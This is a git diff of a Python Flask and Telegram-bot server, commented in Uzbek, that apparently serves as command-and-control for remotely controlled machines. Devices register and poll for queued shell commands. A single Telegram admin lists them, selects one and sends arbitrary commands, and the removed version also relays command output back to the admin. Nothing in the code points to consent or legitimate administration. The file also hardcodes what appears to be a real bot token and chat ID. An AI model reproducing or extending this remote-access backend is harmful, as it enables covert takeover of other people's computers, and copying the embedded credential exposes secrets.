@@ -1,135 +1,104 @@
-# server.py
-import datetime
-import logging
+from threading import Thread
 from flask import Flask, request, jsonify
-from telegram import Bot
+from telegram.ext import Application, CommandHandler
 
-# --------------------
-# Config
-# --------------------
+ADMIN_CHAT_ID = 1612270615
 BOT_TOKEN = "7754620943:AAESsQB-tTOxNlpgr9yfhieOR5ua4enR5DU"
-ADMIN_CHAT_ID = 1612270615  # faqat sizning ID
 
-bot = Bot(BOT_TOKEN)
-
-# Flask app
 app = Flask(__name__)
 
-# Logging sozlamasi
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s [%(levelname)s] %(message)s",
-    handlers=[logging.StreamHandler()]
-)
+devices = {}
+commands = {}
+selected_device = {}
 
-# --------------------
-# Xotira
-# --------------------
-devices = {}    # {deviceId: {"hostname":..., "lastSeen":...}}
-commands = {}   # {deviceId: ["dir", "whoami", ...]}
-selected_device = None
-
-
-# --------------------
-# Routes
-# --------------------
 @app.route("/hello")
 def hello():
-    return "Hello World", 200
-
+    return "Hello World"
 
 @app.route("/register", methods=["POST"])
 def register():
-    """Yangi qurilma ro‘yxatdan o‘tadi"""
     data = request.json
-    deviceId = data.get("deviceId")
-    hostname = data.get("hostname")
+    deviceId = data["deviceId"]
+    hostname = data["hostname"]
 
-    if not deviceId or not hostname:
-        return jsonify({"error": "deviceId va hostname kerak"}), 400
+    devices[deviceId] = {"hostname": hostname}
+    if deviceId not in commands:
+        commands[deviceId] = []
 
-    devices[deviceId] = {"hostname": hostname, "lastSeen": datetime.datetime.now()}
-    commands.setdefault(deviceId, [])
+    return jsonify({"status": "ok"})
 
-    logging.info(f"Yangi qurilma: {hostname} ({deviceId})")
-    bot.send_message(
-        ADMIN_CHAT_ID,
-        f"✅ Yangi device qo'shildi!\n💻 {hostname}\n🆔 {deviceId}"
+@app.route("/get_commands/<device_id>", methods=["GET"])
+def get_commands(device_id):
+    if device_id in commands:
+        cmds = commands[device_id]
+        commands[device_id] = []  
+        return jsonify({"commands": cmds})
+    return jsonify({"commands": []})
+
+async def start(update, context):
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        await update.message.reply_text("⛔ Siz admin emassiz!")
+        return
+
+    await update.message.reply_text(
+        "✅ Bot ishlayapti!\n\n"
+        "Komandalar:\n"
+        "/devices - Qurilmalarni ko‘rish\n"
+        "/select <id> - Qurilmani tanlash\n"
+        "/command <cmd> - Buyruq yuborish"
     )
 
-    return jsonify({"status": "ok"}), 200
+async def devices_cmd(update, context):
+    if not devices:
+        await update.message.reply_text("❌ Qurilma yo‘q.")
+        return
 
+    text = "📱 Qurilmalar:\n"
+    for d_id, info in devices.items():
+        text += f" - {d_id}: {info['hostname']}\n"
 
-@app.route("/get-command/<deviceId>")
-def get_command(deviceId):
-    """Qurilma buyruqlarni olib ketadi"""
-    cmds = commands.get(deviceId, [])
-    commands[deviceId] = []  # olgandan keyin bo‘shatamiz
-    return jsonify({"commands": cmds}), 200
+    await update.message.reply_text(text)
 
+async def select_cmd(update, context):
+    if len(context.args) == 0:
+        await update.message.reply_text("❌ Qurilma ID kiriting: /select <id>")
+        return
 
-@app.route("/send-result", methods=["POST"])
-def send_result():
-    """Qurilma buyruq natijasini yuboradi"""
-    data = request.json
-    deviceId = data.get("deviceId")
-    cmd = data.get("cmd")
-    result = data.get("result")
+    device_id = context.args[0]
+    if device_id not in devices:
+        await update.message.reply_text("❌ Bunday qurilma topilmadi.")
+        return
 
-    if not deviceId or not cmd or result is None:
-        return jsonify({"error": "deviceId, cmd va result kerak"}), 400
+    selected_device[update.effective_user.id] = device_id
+    await update.message.reply_text(f"✅ Tanlandi: {device_id}")
 
-    text = f"💻 {deviceId} → {cmd}\n-----------------\n"
-    # Natija 4000 belgidan uzun bo‘lsa, bo‘lib yuboramiz
-    chunk_size = 4000
-    for i in range(0, len(result), chunk_size):
-        bot.send_message(ADMIN_CHAT_ID, text + result[i:i+chunk_size])
+async def command_cmd(update, context):
+    if len(context.args) == 0:
+        await update.message.reply_text("❌ Buyruq kiriting: /command <cmd>")
+        return
 
-    logging.info(f"Natija qabul qilindi: {deviceId} → {cmd}")
-    return jsonify({"status": "ok"}), 200
+    user_id = update.effective_user.id
+    if user_id not in selected_device:
+        await update.message.reply_text("❌ Avval /select bilan qurilma tanla")
+        return
 
+    device_id = selected_device[user_id]
+    cmd = " ".join(context.args)
+    commands[device_id].append(cmd)
 
-@app.route("/telegram/<command>")
-def telegram_handler(command):
-    """Telegram orqali admin boshqaruvi"""
-    global selected_device
-    args = request.args.get("args", "").split()
+    await update.message.reply_text(f"📤 Buyruq yuborildi: {cmd}")
 
-    if command == "devices":
-        if not devices:
-            bot.send_message(ADMIN_CHAT_ID, "❌ Hozircha device yo'q")
-        else:
-            text = "📋 Aktiv qurilmalar:\n"
-            for d, info in devices.items():
-                text += f"💻 {info['hostname']} (ID: {d})\n"
-            bot.send_message(ADMIN_CHAT_ID, text)
+def run_flask():
+    app.run(host="0.0.0.0", port=4000)
 
-    elif command == "select":
-        if args:
-            deviceId = args[0]
-            if deviceId in devices:
-                selected_device = deviceId
-                bot.send_message(ADMIN_CHAT_ID, f"✅ Device tanlandi: {selected_device}")
-            else:
-                bot.send_message(ADMIN_CHAT_ID, "❌ Bunday ID topilmadi")
-        else:
-            bot.send_message(ADMIN_CHAT_ID, "❌ ID kiritilmadi")
+def run_telegram():
+    app_tg = Application.builder().token(BOT_TOKEN).build()
+    app_tg.add_handler(CommandHandler("start", start))
+    app_tg.add_handler(CommandHandler("devices", devices_cmd))
+    app_tg.add_handler(CommandHandler("select", select_cmd))
+    app_tg.add_handler(CommandHandler("command", command_cmd))
+    app_tg.run_polling()
 
-    elif command == "command":
-        if selected_device and args:
-            cmd = " ".join(args)
-            commands[selected_device].append(cmd)
-            bot.send_message(ADMIN_CHAT_ID, f"📤 Buyruq yuborildi: {cmd}")
-        else:
-            bot.send_message(ADMIN_CHAT_ID, "❌ Avval device tanlang: /select <id>")
-
-    else:
-        bot.send_message(ADMIN_CHAT_ID, f"❌ Noma’lum command: {command}")
-
-    return jsonify({"status": "ok"}), 200
-
-
-# --------------------
-# Run
-# --------------------
-
+if __name__ == "__main__":
+    Thread(target=run_flask, daemon=True).start()
+    run_telegram()
